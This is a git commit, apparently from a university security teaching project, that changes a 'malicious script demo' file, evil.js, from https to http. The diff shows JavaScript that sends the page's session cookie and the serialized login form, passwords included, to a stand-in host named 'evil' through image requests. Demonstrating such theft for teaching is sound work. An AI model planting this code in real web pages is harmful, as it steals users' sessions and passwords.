ac72dfa70153866a544a660c12559a260f6405d5
John King <jnkisd@rit.edu>
2017-10-12 14:14:15 -0400

    Making malicious script demo use http instead of https

--- tracker/evil.js
+++ tracker/evil.js
@@ -2,12 +2,12 @@ var img = [ new Image(), new Image(), new Image()  ];
 img[0].src = 'https://tracker/hit.php';
 
 // Steal the PHP session cookie
-img[1].src = 'https://evil/?' + document.cookie;
+img[1].src = 'http://evil/?' + document.cookie;
 
 // Steal the password at login
 $('form').one('submit', function(e) {
     e.preventDefault();
-    img[2].src = 'https://evil/?' + $('form').serialize();
+    img[2].src = 'http://evil/?' + $('form').serialize();
 
     var form = $(this);
     setTimeout(function() {
